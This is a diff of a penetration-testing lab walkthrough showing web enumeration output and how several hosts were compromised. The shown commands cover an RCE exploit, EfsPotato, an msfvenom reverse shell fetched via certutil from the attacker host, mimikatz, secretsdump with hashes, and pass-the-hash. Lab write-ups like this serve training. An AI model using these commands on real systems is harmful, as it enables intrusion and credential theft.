-200      GET      107l      357w     3293c http://192.168.208.141:81/bower_components/moment/locale/fa.js
-200      GET       70l      237w     2837c http://192.168.208.141:81/bower_components/moment/locale/lo.js
-200      GET       75l      284w     2397c http://192.168.208.141:81/bower_components/moment/locale/ro.js
-200      GET       58l      188w     2579c http://192.168.208.141:81/bower_components/moment/locale/km.js
-200      GET      117l      440w     4120c http://192.168.208.141:81/bower_components/moment/locale/lt.js
-200      GET       79l      321w     2805c http://192.168.208.141:81/bower_components/moment/locale/de-at.js
-200      GET       78l      306w     2735c http://192.168.208.141:81/bower_components/moment/locale/de-ch.js
-200      GET      119l      407w     4021c http://192.168.208.141:81/bower_components/moment/locale/bn.js
-200      GET      105l      339w     3165c http://192.168.208.141:81/bower_components/moment/locale/ar-sa.js
-200      GET       88l      417w     3089c http://192.168.208.141:81/bower_components/moment/locale/ca.js
-200      GET       82l      326w     2574c http://192.168.208.141:81/bower_components/moment/locale/ms.js
-200      GET       71l      262w     2924c http://192.168.208.141:81/bower_components/moment/locale/si.js
-200      GET     1371l     7564w   637479c http://192.168.208.141:81/images/desktop.jpg
-200      GET       91l      417w     3346c http://192.168.208.141:81/bower_components/moment/locale/tzl.js
-200      GET      105l      383w     3363c http://192.168.208.141:81/bower_components/moment/locale/zh-hk.js
-200      GET       79l      329w     2550c http://192.168.208.141:81/bower_components/moment/locale/vi.js
-200      GET       90l      355w     3178c http://192.168.208.141:81/bower_components/moment/locale/bg.js
-200      GET      124l      478w     4360c http://192.168.208.141:81/bower_components/moment/locale/pa-in.js
-200      GET       83l      331w     2672c http://192.168.208.141:81/bower_components/moment/locale/id.js
-200      GET      105l      381w     3099c http://192.168.208.141:81/bower_components/moment/locale/az.js
-200      GET      100l      298w     2679c http://192.168.208.141:81/bower_components/moment/locale/dv.js
-200      GET       73l      305w     2402c http://192.168.208.141:81/bower_components/moment/locale/af.js
-200      GET       60l      234w     2251c http://192.168.208.141:81/bower_components/moment/locale/ar-ma.js
-200      GET       70l      289w     2269c http://192.168.208.141:81/bower_components/moment/locale/sq.js
-200      GET       83l      360w     2796c http://192.168.208.141:81/bower_components/moment/locale/es.js
-200      GET      486l     3203w   220438c http://192.168.208.141:81/dist/img/boxed-bg.jpg
-200      GET        5l       19w     2102c http://192.168.208.141:81/dist/img/icons.png]]
-200      GET       59l      197w     2164c http://192.168.208.141:81/bower_components/moment/locale/ar-tn.js
-200      GET      137l      515w     4478c http://192.168.208.141:81/bower_components/moment/locale/lb.js
-200      GET       89l      344w     2839c http://192.168.208.141:81/bower_components/moment/locale/ss.js
-200      GET       89l      359w     3622c http://192.168.208.141:81/bower_components/moment/locale/te.js
-200      GET       90l      331w     2667c http://192.168.208.141:81/bower_components/moment/locale/tr.js
-200      GET       58l      240w     1912c http://192.168.208.141:81/bower_components/moment/locale/uz-latn.js
-200      GET       75l      290w     2500c http://192.168.208.141:81/bower_components/moment/locale/fy.js
-200      GET      111l      401w     3600c http://192.168.208.141:81/bower_components/moment/locale/zh-cn.js
-200      GET       67l      287w     2188c http://192.168.208.141:81/bower_components/moment/locale/en-nz.js
-200      GET       58l      223w     1960c http://192.168.208.141:81/bower_components/moment/locale/tzm-latn.js
-200      GET       77l      342w     2590c http://192.168.208.141:81/bower_components/moment/locale/gl.js
-200      GET       74l      271w     2370c http://192.168.208.141:81/bower_components/moment/locale/fr-ca.js
-200      GET      100l      215w     3042c http://192.168.208.141:81/dist/css/alt/AdminLTE-select2.css
-200      GET      159l      593w     5870c http://192.168.208.141:81/bower_components/moment/locale/mr.js
-200      GET       61l      237w     2098c http://192.168.208.141:81/bower_components/moment/locale/se.js
-200      GET       78l      304w     2532c http://192.168.208.141:81/bower_components/moment/locale/fr-ch.js
-200      GET       60l      232w     1927c http://192.168.208.141:81/bower_components/moment/locale/nn.js
-200      GET       88l      328w     3266c http://192.168.208.141:81/bower_components/moment/locale/nl.js
-200      GET      151l      536w     5717c http://192.168.208.141:81/bower_components/moment/locale/uk.js
-200      GET       59l      236w     1915c http://192.168.208.141:81/bower_components/moment/locale/sw.js
-200      GET       59l      227w     2219c http://192.168.208.141:81/bower_components/moment/locale/ar-dz.js
-200      GET       76l      338w     2432c http://192.168.208.141:81/bower_components/moment/locale/gd.js
-200      GET       80l      248w     2365c http://192.168.208.141:81/bower_components/moment/locale/ja.js
-200      GET       88l      310w     2780c http://192.168.208.141:81/bower_components/moment/locale/ky.js
-200      GET       69l      286w     2212c http://192.168.208.141:81/bower_components/moment/locale/sv.js
-200      GET       87l      308w     2769c http://192.168.208.141:81/bower_components/moment/locale/kk.js
-200      GET       64l      219w     2253c http://192.168.208.141:81/bower_components/moment/locale/mi.js
-200      GET      162l      688w     5948c http://192.168.208.141:81/bower_components/moment/locale/sl.js
-200      GET      145l      512w     4618c http://192.168.208.141:81/bower_components/moment/locale/hr.js
-200      GET      120l      482w     3824c http://192.168.208.141:81/bower_components/moment/locale/tlh.js
-200      GET     1433l     8653w   763662c http://192.168.208.141:81/dist/img/photo2.png]]
-200      GET       20l      147w    11293c http://192.168.208.141:81/dist/img/user5-128x128.jpg
-200      GET       20l       93w     8707c http://192.168.208.141:81/dist/img/user8-128x128.jpg
-200      GET       22l      148w    14679c http://192.168.208.141:81/dist/img/avatar.png]]
-200      GET        6l       82w     5933c http://192.168.208.141:81/dist/img/user3-128x128.jpg
-200      GET       29l      164w    13759c http://192.168.208.141:81/dist/img/avatar5.png]]
-200      GET     2547l    15691w  1213097c http://192.168.208.141:81/dist/img/photo1.png]]
-200      GET       33l      159w    12210c http://192.168.208.141:81/dist/img/user2-160x160.jpg
-200      GET    13700l    49597w   452020c http://192.168.208.141:81/bower_components/moment/min/moment-with-locales.js
-200      GET     4023l    24508w  2157014c http://192.168.208.141:81/dist/img/photo4.jpg
-200      GET     1203l     7516w   710884c http://192.168.208.141:81/dist/img/photo3.jpg
-200      GET       89l      171w     2200c http://192.168.208.141:81/bower_components/bootstrap/package.json
-301      GET        9l       29w      331c http://192.168.208.141:81/ADMIN => http://192.168.208.141:81/ADMIN/
-302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/logout => index.php
-302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/login => index.php
-301      GET        9l       29w      340c http://192.168.208.141:81/ADMIN/includes => http://192.168.208.141:81/ADMIN/includes/
-200      GET       36l      108w     1377c http://192.168.208.141:81/header
-200      GET       99l      254w     4392c http://192.168.208.141:81/ADMIN/includes/position_modal.php
-200      GET        6l       15w      230c http://192.168.208.141:81/ADMIN/includes/footer.php
-200      GET       92l      241w     4154c http://192.168.208.141:81/ADMIN/includes/cashadvance_modal.php
-200      GET       80l      306w     5520c http://192.168.208.141:81/ADMIN/includes/employee_modal.php
-302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/Login => index.php
-200      GET        8l       42w     1966c http://192.168.208.141:81/bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js
-200      GET       16l       58w     4724c http://192.168.208.141:81/bower_components/jquery-slimscroll/jquery.slimscroll.min.js
-302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/logout.php => index.php
-200      GET        1l      112w     4188c http://192.168.208.141:81/bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css
-200      GET        1l       72w    10804c http://192.168.208.141:81/bower_components/jquery-knob/dist/jquery.knob.min.js
-200      GET      164l     1143w    81906c http://192.168.208.141:81/bower_components/datatables.net/js/jquery.dataTables.min.js
-200      GET       14l      231w    14422c http://192.168.208.141:81/dist/js/adminlte.min.js
-200      GET        6l      427w    62647c http://192.168.208.141:81/bower_components/jquery-sparkline/dist/jquery.sparkline.min.js
-200      GET        7l     1089w    51465c http://192.168.208.141:81/bower_components/moment/min/moment.min.js
-302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/login.php => index.php
-302      GET      645l     2443w    40419c http://192.168.208.141:81/ADMIN/cashadvance.php => index.php
-200      GET      208l      601w     8188c http://192.168.208.141:81/ADMIN/index
-200      GET        7l      369w    35652c http://192.168.208.141:81/bower_components/morris.js/morris.min.js
-200      GET      269l      778w     8163c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/daterangepicker.css
-200      GET        5l      171w    15453c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.min.js
-200      GET     3477l    11280w   109612c http://192.168.208.141:81/bower_components/chart.js/Chart.js
-302      GET      561l     2192w    35874c http://192.168.208.141:81/ADMIN/payroll.php => index.php
-200      GET        7l      757w    15731c http://192.168.208.141:81/bower_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.min.css
-200      GET        3l     1189w    93251c http://192.168.208.141:81/bower_components/raphael/raphael.min.js
-302      GET      642l     2436w    40043c http://192.168.208.141:81/ADMIN/position.php => index.php
-200      GET     1626l     5242w    69588c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/daterangepicker.js
-200      GET        8l      406w    33529c http://192.168.208.141:81/bower_components/bootstrap-datepicker/dist/js/bootstrap-datepicker.min.js
-200      GET       11l       46w    51284c http://192.168.208.141:81/bower_components/Ionicons/css/ionicons.min.css
-302      GET      676l     2503w    41295c http://192.168.208.141:81/ADMIN/overtime.php => index.php
-302      GET      840l     2902w    50562c http://192.168.208.141:81/ADMIN/employee.php => index.php
-302      GET      584l     2281w    38236c http://192.168.208.141:81/ADMIN/schedule_employee.php => index.php
-200      GET       46l       98w     1085c http://192.168.208.141:81/bower_components/jquery-slimscroll/bower.json
-200      GET       32l      103w     1013c http://192.168.208.141:81/bower_components/jquery-slimscroll/package.json
-200      GET      474l     1341w    13832c http://192.168.208.141:81/bower_components/jquery-slimscroll/jquery.slimscroll.js
-302      GET      723l     2662w    43664c http://192.168.208.141:81/ADMIN/home.php => index.php
-200      GET       20l      169w     1096c http://192.168.208.141:81/bower_components/datatables.net/License.txt
-200      GET       36l       53w      692c http://192.168.208.141:81/bower_components/datatables.net/bower.json
-200      GET      841l     3207w    25965c http://192.168.208.141:81/bower_components/fastclick/lib/fastclick.js
-200      GET       12l       15w      174c http://192.168.208.141:81/bower_components/fastclick/bower.json
-200      GET       22l      169w     1068c http://192.168.208.141:81/bower_components/fastclick/LICENSE
-200      GET       64l      116w     1081c http://192.168.208.141:81/bower_components/raphael/webpack.config.js
-200      GET       21l      170w     1083c http://192.168.208.141:81/bower_components/raphael/license.txt
-200      GET       13l     1743w   240427c http://192.168.208.141:81/bower_components/jquery-ui/jquery-ui.min.js
-302      GET      669l     2512w    41541c http://192.168.208.141:81/ADMIN/schedule.php => index.php
-200      GET       32l       72w      894c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/package.json
-200      GET      121l      293w     2780c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.css
-200      GET       10l       90w     2410c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.min.css
-200      GET      137l      364w     3650c http://192.168.208.141:81/bower_components/chart.js/gulpfile.js
-200      GET       11l       24w      239c http://192.168.208.141:81/bower_components/chart.js/bower.json
-200      GET     1480l     4487w    57193c http://192.168.208.141:81/bower_components/Ionicons/css/ionicons.css
-302      GET      650l     2452w    40605c http://192.168.208.141:81/ADMIN/deduction.php => index.php
-200      GET        7l      167w     1060c http://192.168.208.141:81/bower_components/chart.js/LICENSE.md
-200      GET      903l     2094w    26014c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.js
-200      GET       38l       59w      829c http://192.168.208.141:81/bower_components/datatables.net-bs/bower.json
-200      GET       55l      387w     2991c http://192.168.208.141:81/bower_components/chart.js/CONTRIBUTING.md
-200      GET       20l      169w     1096c http://192.168.208.141:81/bower_components/datatables.net-bs/License.txt
-200      GET       28l       57w      664c http://192.168.208.141:81/bower_components/chart.js/package.json
-200      GET       12l       20w      234c http://192.168.208.141:81/bower_components/bootstrap-datepicker/bower.json
-200      GET       48l       88w     1246c http://192.168.208.141:81/bower_components/bootstrap-datepicker/package.json
-200      GET      182l      598w     4559c http://192.168.208.141:81/bower_components/datatables.net-bs/js/dataTables.bootstrap.js
-200      GET        6l       18w      269c http://192.168.208.141:81/Scripts
-200      GET       11l      378w    52091c http://192.168.208.141:81/bower_components/chart.js/Chart.min.js
-200      GET        3l     1127w    90152c http://192.168.208.141:81/bower_components/raphael/raphael.no-deps.min.js
-200      GET        8l     2944w   210932c http://192.168.208.141:81/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js
-302      GET      885l     3124w    54235c http://192.168.208.141:81/ADMIN/attendance.php => index.php
-200      GET     8353l    34429w   314913c http://192.168.208.141:81/bower_components/raphael/raphael.js
-200      GET       40l       76w      826c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-1.2.2.css
-200      GET       44l      271w     1827c http://192.168.208.141:81/bower_components/jquery-ui/LICENSE.txt
-200      GET       69l      163w     2083c http://192.168.208.141:81/bower_components/jquery-ui/composer.json
-200      GET       13l       21w      221c http://192.168.208.141:81/bower_components/jquery-ui/component.json
-200      GET       12l       18w      151c http://192.168.208.141:81/bower_components/jquery-ui/bower.json
-200      GET       71l      149w     1689c http://192.168.208.141:81/bower_components/jquery-ui/package.json
-200      GET      284l      883w    10759c http://192.168.208.141:81/bower_components/jquery-ui/AUTHORS.txt
-200      GET        8l      267w    33323c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-1.2.2.min.js
-200      GET     7927l    32618w   299364c http://192.168.208.141:81/bower_components/raphael/raphael.no-deps.js
-200      GET       31l       59w      691c http://192.168.208.141:81/bower_components/Ionicons/bower.json
-200      GET       19l       35w      429c http://192.168.208.141:81/bower_components/Ionicons/component.json
-200      GET       36l       66w      887c http://192.168.208.141:81/bower_components/Ionicons/composer.json
-200      GET        5l        8w       94c http://192.168.208.141:81/bower_components/raphael/dev/raphael.amd.js
-200      GET       21l      171w     1094c http://192.168.208.141:81/bower_components/Ionicons/LICENSE
-200      GET     2012l     2913w    67903c http://192.168.208.141:81/bower_components/raphael/yarn.lock
-301      GET        9l       29w      369c http://192.168.208.141:81/bower_components/jquery-slimscroll/examples => http://192.168.208.141:81/bower_components/jquery-slimscroll/examples/
-200      GET      149l      731w     5039c http://192.168.208.141:81/bower_components/chart.js/docs/02-Bar-Chart.md
-200      GET      166l      797w     5570c http://192.168.208.141:81/bower_components/chart.js/docs/01-Line-Chart.md
-200      GET      158l      827w     5710c http://192.168.208.141:81/bower_components/chart.js/docs/05-Pie-Doughnut-Chart.md
-200      GET        1l      961w   144313c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-world-mill-en.js
-200      GET      343l      828w    10089c http://192.168.208.141:81/bower_components/chart.js/src/Chart.Radar.js
-200      GET      303l      770w    13014c http://192.168.208.141:81/bower_components/jquery-knob/
-200      GET        1l      330w    95062c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-usa-en.js
-200      GET      755l     4545w   389831c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/drp.png]]
-200      GET       15l      108w     7429c http://192.168.208.141:81/images/facebook-profile-image.jpeg
-200      GET    16617l    60375w   470596c http://192.168.208.141:81/bower_components/jquery-ui/jquery-ui.js
-200      GET       41l       73w     1084c http://192.168.208.141:81/bower_components/jquery-sparkline/Makefile
-200      GET       20l       33w      390c http://192.168.208.141:81/bower_components/morris.js/bower.travis.json
-200      GET       90l      182w     2274c http://192.168.208.141:81/bower_components/morris.js/Gruntfile.js
-200      GET       20l       35w      391c http://192.168.208.141:81/bower_components/morris.js/bower.json
-200      GET       36l       71w      871c http://192.168.208.141:81/bower_components/morris.js/package.json
-200      GET        2l        8w      433c http://192.168.208.141:81/bower_components/morris.js/morris.css
-301      GET        9l       29w      355c http://192.168.208.141:81/bower_components/Ionicons/png]] => http://192.168.208.141:81/bower_components/Ionicons/png]]/
-200      GET     1892l     7068w    66047c http://192.168.208.141:81/bower_components/morris.js/morris.js
-200      GET       22l      135w     1143c http://192.168.208.141:81/bower_components/bootstrap/ISSUE_TEMPLATE.md
-200      GET        9l       26w      365c http://192.168.208.141:81/bower_components/jquery-slimscroll/examples/index
-200      GET       12l       55w      982c http://192.168.208.141:81/bower_components/Ionicons/src/calendar
-200      GET    15242l    64948w   445792c http://192.168.208.141:81/bower_components/datatables.net/js/jquery.dataTables.js
-200      GET       27l       50w      484c http://192.168.208.141:81/bower_components/morris.js/less/morris.core.less
-301      GET        9l       29w      365c http://192.168.208.141:81/bower_components/morris.js/examples/lib => http://192.168.208.141:81/bower_components/morris.js/examples/lib/
-200      GET      117l      239w     2553c http://192.168.208.141:81/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.css
-200      GET        4l     1058w    69597c http://192.168.208.141:81/bower_components/jquery/dist/jquery.slim.min.js
-200      GET        1l        7w   131666c http://192.168.208.141:81/bower_components/jquery/dist/jquery.min.map
-200      GET        1l        2w   104583c http://192.168.208.141:81/bower_components/jquery/dist/jquery.slim.min.map
-200      GET    14975l    50670w   566620c http://192.168.208.141:81/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.js
-200      GET     8160l    32872w   215256c http://192.168.208.141:81/bower_components/jquery/dist/jquery.slim.js
-200      GET      140l      145w   306319c http://192.168.208.141:81/dist/css/adminlte.min.css.map
-200      GET    10253l    40950w   268039c http://192.168.208.141:81/bower_components/jquery/dist/jquery.js
-200      GET      140l      145w   309656c http://192.168.208.141:81/dist/css/adminlte.css.map
-302      GET        0l        0w        0c http://192.168.208.141:81/admin/login => index.php
-200      GET       14l       55w     1196c http://192.168.208.141:81/bower_components/Ionicons/src/Help
-200      GET       10l       61w      733c http://192.168.208.141:81/bower_components/Ionicons/src/information
-200      GET        8l       48w      706c http://192.168.208.141:81/bower_components/Ionicons/src/play
-200      GET       15l       29w      324c http://192.168.208.141:81/ADMIN/includes/datatable_initializer.php
-200      GET       99l      248w     4433c http://192.168.208.141:81/ADMIN/includes/deduction_modal.php
-200      GET      107l      268w     4813c http://192.168.208.141:81/ADMIN/includes/schedule_modal.php
-302      GET       36l      340w     5366c http://192.168.208.141:81/ADMIN/includes/session.php => index.php
-200      GET      104l      297w     4116c http://192.168.208.141:81/ADMIN/includes/scripts.php
-200      GET      138l      342w     6212c http://192.168.208.141:81/ADMIN/includes/overtime_modal.php
-302      GET        8l       72w     1363c http://192.168.208.141:81/ADMIN/profile_update.php => home.php
-200      GET       18l       87w     1495c http://192.168.208.141:81/bower_components/bootstrap-datepicker/dist/
-200      GET       72l      389w     6091c http://192.168.208.141:81/ADMIN/includes/menubar.php
-200      GET      130l      891w    13938c http://192.168.208.141:81/ADMIN/includes/navbar.php
-302      GET      723l     2662w    43664c http://192.168.208.141:81/ADMIN/home => index.php
-200      GET      119l      660w    11189c http://192.168.208.141:81/ADMIN/includes/profile_modal.php
-200      GET      132l      321w     5988c http://192.168.208.141:81/ADMIN/includes/attendance_modal.php
-200      GET       33l      201w     3380c http://192.168.208.141:81/ADMIN/includes/employee_schedule_modal.php
-200      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/includes/conn.php
-200      GET     3063l    11627w   123754c http://192.168.208.141:81/bower_components/jquery-sparkline/dist/jquery.sparkline.js
-200      GET       17l       73w     1309c http://192.168.208.141:81/bower_components/jquery-sparkline/dist/
-301      GET        9l       29w      358c http://192.168.208.141:81/bower_components/bootstrap/grunt => http://192.168.208.141:81/bower_components/bootstrap/grunt/
-200      GET       12l       54w      860c http://192.168.208.141:81/bower_components/Ionicons/src/monitor
-200      GET       14l       54w     1389c http://192.168.208.141:81/bower_components/Ionicons/src/key
-200      GET       12l       60w      892c http://192.168.208.141:81/bower_components/Ionicons/src/ARCHIVE
-200      GET      127l      283w     2034c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/Website
-200      GET       20l      171w     1082c http://192.168.208.141:81/bower_components/jquery-knob/LICENSE
-200      GET       11l       52w      782c http://192.168.208.141:81/bower_components/Ionicons/src/Share
-301      GET        9l       29w      340c http://192.168.208.141:81/ADMIN/INCLUDES => http://192.168.208.141:81/ADMIN/INCLUDES/
-200      GET        7l       59w      604c http://192.168.208.141:81/bower_components/Ionicons/src/Plus
-301      GET        9l       29w      340c http://192.168.208.141:81/Admin/INCLUDES => http://192.168.208.141:81/Admin/INCLUDES/
-200      GET      208l      601w     8188c http://192.168.208.141:81/Admin/Index
-200      GET      146l      366w     5026c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/website.js
-200      GET      127l      283w     2034c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/website.css
-200      GET      852l     2720w    44920c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/Index
-200      GET      104l      297w     4116c http://192.168.208.141:81/Admin/INCLUDES/scripts
-301      GET        9l       29w      349c http://192.168.208.141:81/bower_components/jQuery => http://192.168.208.141:81/bower_components/jQuery/
-200      GET     2084l     9398w    77973c http://192.168.208.141:81/bower_components/jquery-ui/ui/datepicker
-301      GET        9l       29w      358c http://192.168.208.141:81/bower_components/jQuery/external => http://192.168.208.141:81/bower_components/jQuery/external/
-200      GET       22l       80w     1752c http://192.168.208.141:81/bower_components/Ionicons/src/clipboard
-301      GET        9l       29w      354c http://192.168.208.141:81/bower_components/jQuery/dist => http://192.168.208.141:81/bower_components/jQuery/dist/
-200      GET       13l       56w     1052c http://192.168.208.141:81/bower_components/Ionicons/src/ipod
-200      GET       25l       65w     2391c http://192.168.208.141:81/bower_components/Ionicons/src/AT
-200      GET     2084l     9398w    77973c http://192.168.208.141:81/bower_components/jquery-ui/ui/DatePicker
-200      GET       15l       57w     1003c http://192.168.208.141:81/bower_components/Ionicons/src/eye
-301      GET        9l       29w      365c http://192.168.208.141:81/bower_components/morris.js/spec/SUPPORT => http://192.168.208.141:81/bower_components/morris.js/spec/SUPPORT/
-200      GET       21l       69w     1404c http://192.168.208.141:81/bower_components/Ionicons/src/xbox
-200      GET       21l       63w     1911c http://192.168.208.141:81/bower_components/Ionicons/src/Clock
-301      GET        9l       29w      349c http://192.168.208.141:81/bower_components/JQuery => http://192.168.208.141:81/bower_components/JQuery/
-200      GET       36l      242w     1605c http://192.168.208.141:81/bower_components/JQuery/license
-200      GET      476l     1907w    11197c http://192.168.208.141:81/bower_components/jQuery/dist/Core
-301      GET        9l       29w      365c http://192.168.208.141:81/bower_components/morris.js/examples/LIB => http://192.168.208.141:81/bower_components/morris.js/examples/LIB/
-200      GET        0l        0w        0c http://192.168.208.141:81/Admin/INCLUDES/Conn
-200      GET        9l       49w      819c http://192.168.208.141:81/bower_components/Ionicons/src/UpLoad
-200      GET        7l       30w     2816c http://192.168.208.141:81/dist/img/credit/cirrus
-
-```
-
-Found the http://192.168.208.141:81/db/ with the database hashes, but it is failed
-
-![Pasted image 20251215150836.png](/ob/Pasted%20image%2020251215150836.png)
-
-![Pasted image 20251215150859.png](/ob/Pasted%20image%2020251215150859.png)
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "CVE-2021-44087" >}} The webapp reveals that the website is using the Attendance and Payroll System which is easy to be attack as the RCE
-
-{{< /toggle >}}
-
-The title shows that 50801 RCE in https://www.exploit-db.com/exploits/50801
 
 ![Pasted image 20251215151425.png](/ob/Pasted%20image%2020251215151425.png)
 
+Used the `whatweb` to identify the tech stack is used Attendence and Payroll system  https://www.exploit-db.com/exploits/50801
+
 ```shell
+┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 ─# python3 50801.py  http://192.168.208.141:81                
 
     >> Attendance and Payroll System v1.0
@@ -803,11 +159,17 @@ The title shows that 50801 RCE in https://www.exploit-db.com/exploits/50801
 
 ```
 
+Attendence and Payroll system can be abused by this [exploit](https://www.exploit-db.com/exploits/50801) which  abuse the /apsystem/admin/employee\_edit\_photo.php to upload php revshell  in the /apsystem/images/shell.php to have RCE
+
 ### mary.williams to admin(SeImpersonatePrivilege)
 
-![Pasted image 20251215152042.png](/ob/Pasted%20image%2020251215152042.png)
+{{< toggle "Tag 🏷️" >}}
 
-After the admin , use the mimikatz to find more
+{{< tag "Windows-Privilege-Escalation-SeImpersonatePrivilege" >}} Checking for SeImpersonatePrivilege Token by whoami then doing EfsPotato.cs exploit
+
+{{< /toggle >}}
+
+![Pasted image 20251215152042.png](/ob/Pasted%20image%2020251215152042.png)
 
 ```shell
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe C:\ProgramData\EfsPotato.cs -nowarn:1691,618
@@ -815,18 +177,14 @@ dir  C:\ProgramData\
 EfsPotato.exe whoami
 
 
-
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.204 LPORT=80  -f exe -o reverse.exe
- sudo msfconsole
- use exploit/multi/handler
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.204 LPORT=80  -f exe -o reverse.exe
+sudo msfconsole
+use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
- set LHOST 192.168.45.204
-  set LPORT 80
-  exploit
-  
-  
+set LHOST 192.168.45.204
+set LPORT 80
+exploit
 certutil -urlcache -split -f http://192.168.45.204:8081/reverse.exe C:\ProgramData\reverse.exe
-
 EfsPotato.exe "C:\ProgramData\reverse.exe" netlogon
 ```
 
@@ -834,9 +192,27 @@ EfsPotato.exe "C:\ProgramData\reverse.exe" netlogon
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag " Lateral-Movement-mimikatz" >}} mimikatz.exe use the command of sekurlsa::logonpasswords to found the new cred of user 's NTLM
+{{< tag " Lateral-Movement-mimikatz" >}} Using mimikatz to find the new user 's NTLM ,holding the Mary.Williams to find the new user of celia.almeda ,then evil-winrm with hash to the new user.
 
 {{< /toggle >}}
+
+{{< mindmap >}}
+
+# Lateral-Movement mimikatz usage
+
+* privilege::debug
+* sekurlsa::logonpasswords
+* sekurlsa::credman
+* lsadump::secrets
+
+# sekurlsa::logonpasswords
+
+* NTLM
+  * evil-winrm
+
+{{< /mindmap >}}
+
+Using mimikatz to find the new user 's NTLM,
 
 ```shell
 C:\mimikatz_trunk\x64>mimikatz.exe
@@ -1366,23 +742,28 @@ Info: Establishing connection to remote endpoint
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Windows-Privilege-Escalation-windows-Files" >}} The windows.old file should not be here , which will backup a lot of sensitive data
+{{< tag "Windows-Privilege-Escalation-windows-Files" >}} Discovering windows.old file which contain sensitive data ,like SAM , SYSTEM ,then using the secretsdump.py to get the admin 's hash , then using the evil-winrm to arrive admin folder
 
 {{< /toggle >}}
 
-Windows old should not be here\
+{{< mindmap >}}
+
+# windows.old
+
+* SAM
+* SYSTEM
+
+# secretsdump.py
+
+* hash
+  * evil-winrm
+
+{{< /mindmap >}}
+
+Discovering the `windows.old` and contain the SAM,SYSTEM, also reference [to](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)\
 ![Pasted image 20251215160528.png](/ob/Pasted%20image%2020251215160528.png)
 
-![Pasted image 20251215162641.png](/ob/Pasted%20image%2020251215162641.png)
-
 ![Pasted image 20251215162722.png](/ob/Pasted%20image%2020251215162722.png)
-
-找到SAM 和 SYSTEM 在一個奇怪的windows old file ，hint :可以透過目期去估那一個是容易被利用
-
-https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
-
-透過 secretsdump 找到administrator 的hash\
-不過在使用secretdump 之前 ，要使用ligolo 進行雙樞紐
 
 ```
 └─# secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL 
@@ -1404,6 +785,8 @@ Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c7
 └─# 
 ```
 
+Found the hashes with secretsdump.py  ,so user the evil-winrm  to arrive tom\_admin 's admin foler.
+
 ```
 evil-winrm -i 10.10.100.140  -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'
 ```
@@ -1413,6 +796,8 @@ evil-winrm -i 10.10.100.140  -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc
 # Recon 192.168.X.143
 
 ```shell
+┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
+└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.X.143 -oN serviceScan.txt
 21/tcp   open  ftp        vsftpd 3.0.3
 22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -1448,45 +833,13 @@ Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-### SSH 22 --Scans
-
-> 可以在域上暴力破解主機名/子域。
-
-```
-[REDO-ATTEMPT] target 192.168.217.143 - login "pi" - pass "raspberry" - 136 of 136 [child 1] (2/2)
-1 of 1 target completed, 0 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 10:23:27
-```
-
-### FTP 21 -- Scans
-
-* 匿名登入
-* 爆破登入
-
-> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。
-
-```shell
-─#  ftp 192.168.217.143
-Connected to 192.168.217.143.
-220 (vsFTPd 3.0.3)
-Name (192.168.217.143:root): anonymous
-331 Please specify the password.
-Password: 
-530 Login incorrect.
-ftp: Login failed
-ftp> 
-```
-
-### CVE-2020-13151
+### 3003 TCP
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "CVE-2020-13151" >}} The port 3003 with the help command show that the cms version and it also easy to be RCE attack\
+{{< tag "CVE-2020-13151" >}} Discovering Aerospike Community Edition 5.1 in port 3003 cgms which  can be exploited by CVE-2020-13151 to have the RCE
+
 {{< /toggle >}}
-
-https://github.com/b4ny4n/CVE-2020-13151
-
-### port 3003
 
 ```
 └─# nc -nv 192.168.217.143 3003
@@ -1519,27 +872,20 @@ $
 
